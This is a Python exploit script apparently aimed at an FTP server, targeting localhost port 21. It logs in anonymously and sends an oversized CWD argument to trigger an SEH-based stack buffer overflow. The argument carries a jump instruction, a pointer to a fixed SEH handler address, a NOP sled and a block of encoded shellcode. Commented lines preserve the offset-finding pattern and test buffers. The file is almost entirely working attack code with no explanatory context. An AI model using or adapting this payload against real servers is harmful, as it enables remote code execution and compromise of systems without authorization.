import socket
import struct

seh =struct.pack('<L', 0x1220401e)

#buffer = "A"*1037+"BBBB"+seh+"D"* (2500-1037-4-4) # put breakpoint at 0x1220401e to see if its being taken

#buffer = "A"*1037+"\xeb\x0a\x90\x90"+seh+"D"* (2500-1037-4-4) #jump to shellcode

shellcode =("\xda\xd3\xd9\x74\x24\xf4\x5e\x29\xc9\xb8\xa2\xcb\x9a\x1f\xb1"
"\x56\x31\x46\x18\x03\x46\x18\x83\xee\x5e\x29\x6f\xe3\x76\x27"
"\x90\x1c\x86\x58\x18\xf9\xb7\x4a\x7e\x89\xe5\x5a\xf4\xdf\x05"
"\x10\x58\xf4\x9e\x54\x75\xfb\x17\xd2\xa3\x32\xa8\xd2\x6b\x98"
"\x6a\x74\x10\xe3\xbe\x56\x29\x2c\xb3\x97\x6e\x51\x3b\xc5\x27"
"\x1d\xe9\xfa\x4c\x63\x31\xfa\x82\xef\x09\x84\xa7\x30\xfd\x3e"
"\xa9\x60\xad\x35\xe1\x98\xc6\x12\xd2\x99\x0b\x41\x2e\xd3\x20"
"\xb2\xc4\xe2\xe0\x8a\x25\xd5\xcc\x41\x18\xd9\xc1\x98\x5c\xde"
"\x39\xef\x96\x1c\xc4\xe8\x6c\x5e\x12\x7c\x71\xf8\xd1\x26\x51"
"\xf8\x36\xb0\x12\xf6\xf3\xb6\x7d\x1b\x02\x1a\xf6\x27\x8f\x9d"
"\xd9\xa1\xcb\xb9\xfd\xea\x88\xa0\xa4\x56\x7f\xdc\xb7\x3f\x20"
"\x78\xb3\xd2\x35\xfa\x9e\xba\xfa\x31\x21\x3b\x94\x42\x52\x09"
"\x3b\xf9\xfc\x21\xb4\x27\xfa\x46\xef\x90\x94\xb8\x0f\xe1\xbd"
"\x7e\x5b\xb1\xd5\x57\xe3\x5a\x26\x57\x36\xcc\x76\xf7\xe8\xad"
"\x26\xb7\x58\x46\x2d\x38\x87\x76\x4e\x92\xbe\xb0\x80\xc6\x93"
"\x56\xe1\xf8\x34\xa3\x6c\x1e\x50\xbb\x38\x88\xcc\x79\x1f\x01"
"\x6b\x81\x75\x3d\x24\x15\xc1\x2b\xf2\x1a\xd2\x79\x51\xb6\x7a"
"\xea\x21\xd4\xbe\x0b\x36\xf1\x96\x42\x0f\x92\x6d\x3b\xc2\x02"
"\x71\x16\xb4\xa7\xe0\xfd\x44\xa1\x18\xaa\x13\xe6\xef\xa3\xf1"
"\x1a\x49\x1a\xe7\xe6\x0f\x65\xa3\x3c\xec\x68\x2a\xb0\x48\x4f"
"\x3c\x0c\x50\xcb\x68\xc0\x07\x85\xc6\xa6\xf1\x67\xb0\x70\xad"
"\x21\x54\x04\x9d\xf1\x22\x09\xc8\x87\xca\xb8\xa5\xd1\xf5\x75"
"\x22\xd6\x8e\x6b\xd2\x19\x45\x28\xe2\x53\xc7\x19\x6b\x3a\x92"
"\x1b\xf6\xbd\x49\x5f\x0f\x3e\x7b\x20\xf4\x5e\x0e\x25\xb0\xd8"
"\xe3\x57\xa9\x8c\x03\xcb\xca\x84")

nops="\x90"*30

buffer = "\x41" * 1037 + "\xeb\x0a\x90\x90" + seh + nops+ shellcode+"D"*(2500-1037-4-4-len(nops)-len(shellcode))
#buffer = "A"*2500
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"

server = '127.0.0.1'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, 21))
data = s.recv(1024)
s.send('USER anonymous' + '\r\n')
data = s.recv(1024)
s.send('PASS anonymous' + '\r\n')
data = s.recv(1024)
print "sending payload of size"+str(len(buffer))
s.send('CWD ' +buffer+'\r\n')
s.close()


